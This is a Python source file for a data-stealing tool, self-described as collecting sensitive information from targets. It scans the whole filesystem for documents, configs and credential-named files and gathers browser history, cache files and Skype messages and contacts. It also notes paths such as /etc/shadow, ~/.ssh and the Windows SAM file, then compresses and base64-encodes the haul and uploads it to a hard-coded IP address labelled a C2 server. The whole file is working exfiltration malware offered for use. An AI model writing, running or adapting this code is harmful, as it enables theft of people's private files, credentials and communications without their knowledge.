'''
 # @ Create Time: 2024-09-04 11:10:07
 # @ Modified time: 2024-09-04 11:35:24
 # @ Description: class to collect sensitive information from targets
 '''
from __future__ import annotations

from pathlib import Path
import platform
import base64
import zlib
import tempfile
import os
import sys
import importlib
import subprocess

def ensure_module(name, pkg=None):
    pkg = pkg or name
    try:
        return importlib.import_module(name)
    except ImportError:
        print(f"[+] Installing missing package: {pkg}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
        return importlib.import_module(name)

# Now use it safely:
bh = ensure_module("browserhistory", "browserhistory==0.1.2")
Skype = ensure_module("skpy", "Skpy==0.11").Skype
dotenv = ensure_module("dotenv", "python-dotenv==1.0.1")
requests = ensure_module("requests", "requests==2.32.3")

from dotenv import load_dotenv
# load .env for sensitive tokens
load_dotenv()

class SenInfoScanner:

    def __init__(self, save_location: Path, root_path=None):
        ''' 
        :param save_location: local position or remote site
        :param root_path: the root path to start scanning
        '''
        self.save_location = save_location
        # dynamically set root path based on the operating system
        if root_path:
            self.root_path = root_path
        else:
            if platform.system() == 'Windows':
                # Start scanning from the C:\ drive on Windows
                self.root_path = 'C:\\'
            else:
                # Default to root path for Linux/macOS
                self.root_path = '/'

    def _ext_scan(self, target_ext: list):
        ''' cover potential sensitive info via file extension
        
        - financial spreadsheets (.xls, .xlsx, .csv)
        - documents (.docx, .pdf)
        - intellectual property (IP) (.pptx, .py, .js)
        - configuration files (.conf, .ini, .xml)
        '''
        sen_files = []
        for ext in target_ext:
            for root, dirs, files in os.walk(self.root_path):
                for file in files:
                    if file.endswith(ext):
                        file_path = os.path.join(root, file)
                        sen_files.append(file_path)
        
        return sen_files


    def _filename_scan(self,):
        ''' cover the filenames that can contain credentials info
        
        '''
        sen_filenames = []
        patterns = ['password', 'credentials','secret', 'key','login']
        for root, dirs, files in os.walk(self.root_path):
            for file in files:
                if any(pattern in file.lower() for pattern in patterns):
                    file_path = os.path.join(root, file)
                    sen_filenames.append(file_path)
        
        return sen_filenames

    
    def _brw_hist(self,):
        ''' get broswer history data
        
        '''
        hist_data = bh.get_browserhistory()
        return hist_data
    
    def _cache(self,):
        ''' scan for sen info in cache files
        
        '''
        cache_paths = []
        if platform.system() == "Windows":
            # common cache directories on Windows
            cache_dirs = [
                # user cache
                os.path.expanduser("~\\AppData\\Local\\Temp"),
                # system temp directory
                "C:\\Windows\\Temp",
                os.path.expanduser("~\\AppData\\Local")
            ]
        else:
            # common cache directories on Linux/macOS
            cache_dirs = [
                "/var/cache",
                "/tmp",
                os.path.expanduser('~/.cache')
            ]
    
        # scan the cache directories
        for cache_dir in cache_dirs:
            if os.path.exists(cache_dir):
                for root, dires, files in os.walk(cache_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        cache_paths.append(file_path)
        
        return cache_paths


    def _db(self, return_info: False):
        ''' cover potential db info like skype contact info
        
        '''
        db_files = []
        for root, dirs, files in os.walk(self.root_path):
            for file in files:
                if file.endswith('.sqlite') or file.endswith('.db'):
                    db_files.append(os.path.join(root, file))
        
        if return_info:
            # optional manipulation
            db_info = []
            for db_file in db_files:
                try:
                    dbreader = Skype.SkypeDB(db_file)
                    profile_list = dbreader.ExtProfile()
                    contracts_list = dbreader.ExtContracts()
                    calllog_list = dbreader.ExtCallLog()
                    message_list = dbreader.ExtMessage()
                    db_info.append(
                        {"db_file": db_file,
                        "profile": profile_list,
                        "contracts": contracts_list,
                        "calllog": calllog_list,
                        "messages": message_list
                        }
                    )
                except Exception as e:
                    db_info.append(
                        {"db_file": db_file,
                        "error": str(e)
                        }
                    )
            return db_info
        else:
            return db_files


    def _path(self,):
        sen_paths = []

        if platform.system() == "Windows":
            comm_sen_paths = [
                # Windows SAM file
                'C:\\Windows\\System32\\config\\SAM',    
                # User AppData Local folder         
                os.path.expanduser('~\\AppData\\Local'),    
                # Program Files       
                'C:\\Program Files',     
                # Program Files for 32-bit apps                          
                'C:\\Program Files (x86)',                         
                os.path.expanduser('~\\Documents'),   
            ]
        else:
            comm_sen_paths = [
                # User account details
                '/etc/passwd',         
                 # Shadow password file                            
                '/etc/shadow',         
                # SSH configuration folder                           
                os.path.expanduser('~/.ssh'),      
                # Log files                
                '/var/log',                                        
                os.path.expanduser('~/Documents'), 
            ]

        for path in comm_sen_paths:
            if os.path.exists(path):
                sen_paths.append(path)
        
        return sen_paths


    def _encode_compress(self, data:str):
        ''' compress and encode extracted system info with Maximum compression
        
        '''
        # first compression
        compress_1_data = zlib.compress(data.encode())

        # second compression
        compress_2_data = zlib.compress(compress_1_data)

        # base64 encoding
        final_encoded = base64.b64encode(compress_2_data)

        return final_encoded

    def _sen_info(self, file:str):
        ''' the module to collect sensitive info from specific locations/files/extensions
        
        '''
        target_ext = ['.xls', '.xlsx', '.csv', '.docx', '.pdf', '.pptx', '.py', '.js', '.conf', '.ini', '.xml']
        collected_info = {
            'file_extensions': self._ext_scan(target_ext),
            'sensitive_filenames': self._filename_scan(),
            'browser_history': self._brw_hist(),
            'cache_files': self._cache(),
            'databases': self._db(True),
            'sensitive_paths': self._path()
        }

        # compress and encode the collected information
        encoded_compressed_info = self._encode_compress(str(collected_info))

        with Path(self.save_location).joinpath(file).open("wb") as fw:
            fw.write(encoded_compressed_info)

    def _send_file(self, file, upload_url):
        try:
            with Path(self.save_location).joinpath(file).open('rb') as f:
                print(f"[+] Sending data to {upload_url}")
                r = requests.post(upload_url, files={'file': f})
                print("[+] Response:", r.status_code, r.text)
        except Exception as e:
            print("[-] Failed to send:", e)


if __name__ == "__main__":

    temp_path = tempfile.gettempdir()
    senscanner = SenInfoScanner(temp_path)
    # define the file
    file_name = "files.json"

    # get the information and saved to a temp folder
    senscanner._sen_info(file_name)
    from pathlib import Path
    # upload file to c2 server
    remote_file = Path(temp_path).joinpath(file_name)

    remote_upload_url = f"http://20.93.23.234:8081/upload" 
    senscanner._send_file(file_name, remote_upload_url)
